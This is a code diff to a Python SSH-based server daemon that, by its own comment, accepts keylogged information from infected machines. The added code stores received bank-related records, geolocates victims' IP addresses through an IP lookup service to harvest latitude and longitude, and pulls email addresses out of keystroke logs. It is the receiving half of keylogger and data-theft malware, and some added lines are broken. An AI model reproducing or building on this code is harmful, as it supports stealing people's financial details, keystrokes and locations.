@@ -357,7 +357,7 @@ class MyDaemon(Daemon):
             os._exit(0)
 
 
-def handle(conn): #
+def handle(conn): #accpet keylogged info and save it to files
     chan = conn
     request = chan.recv(1024).decode()
     logger.info("Client said this ->" + str(request))
@@ -369,27 +369,24 @@ def handle(conn): #
     if request=='infobank.txt':
         print("recieved bank.txt")
         info=chan.recv(1024).decode('utf-8')
-        
-        seperated=info.split(',')
-        with open('dosthiswork.csv', 'a',  newline='|') as writer:
-            writer.write(info)
-        response=requests.get("http://ip-api.com/json/%s"%(seperated[6]))
-        if  response.status_code==200:#if ip-api runs successfully save the results into another csv
-            txt=json.dumps(response.json())
-            print(txt)
-            with open('moreInfo.csv', 'a',  newline='') as writer:
-                    writer.write(txt)
+        seperated=info.split('|')
+        with open(cwd+'/dosthiswork.csv', 'a',  newline='') as writer:
+            for x in range(len(seperated)):
+                if len(seperated[x])>1:
+                    writer.write(seperated[x])
+                    newlist=seperated[x].split(',')
+                    response=requests.get("http://ip-api.com/json/%s"%(newlist[6])) #use ip-api.com's api to look up ip address and harvest more info like latitude/longitude
+                    if  response.status_code==200:#if ip-api runs successfully save the results into another csv
+                        txt=json.dumps(response.json())
+                        print(txt)
+                        writer.write(txt)
+                    newlist=seperated[x].split(',')
+                    soup(newlist[0], newlist[1], newlist[2], newlist[3])
     elif request=='keylog.txt':#if its a keylogged file just accept the file
-        chan.recv(2048)
-        
-    #use ip-api.com's api to look up ip address and harvest more info like latitude/longitude
-    response=requests.get("http://ip-api.com/json/%s"%(seperated[6]))
-    if  response.status_code==200:#if ip-api runs successfully save the results into another csv
-        txt=json.dumps(response.json())
-        print(txt)
-        with open('moreInfo.csv', 'a',  newline='') as writer:
-                writer.write(txt)
-    #signUp(data1[i])
+        info2=chan.recv(2048)
+        email=re.findall(r"[a-z0-9\.\-+_]+@[a-z0-9\.\-+_]+\.[a-z]+", info2)
+        with open(cwd+'/dosthiswork.csv', 'a',  newline='') as writer:
+            write.write(email)
     print("Done!")
     try:
         conn.close()
@@ -397,7 +394,6 @@ def handle(conn): #
         pass
         
     return 0
-    
     
 class Server (paramiko.ServerInterface):
     host_key = paramiko.RSAKey(filename=keyLoc)
